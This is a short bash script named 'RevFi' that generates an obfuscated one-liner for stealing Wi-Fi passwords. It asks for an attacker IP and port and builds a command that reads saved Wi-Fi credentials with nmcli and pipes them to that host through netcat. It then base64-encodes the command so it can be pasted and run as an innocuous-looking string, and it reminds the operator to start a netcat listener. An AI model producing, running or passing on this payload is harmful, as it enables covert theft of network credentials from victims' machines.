#!/bin/bash

echo ""

echo -e "\e[1;36mRevFi\e[0m is NOT a magic wand... Get creative!"

echo ""

echo "IP:"
read ip_address

echo ""

echo "PORT:"
read port

command_to_run="nmcli device wifi show-password | nc $ip_address $port"

encoded_command=$(echo -n "$command_to_run" | base64)

echo ""

echo "base64 -d <<< \"$encoded_command\" | sh"

echo ""

echo -e "\e[1;31mNOTE: USE NETCAT LISTENER!\e[0m"

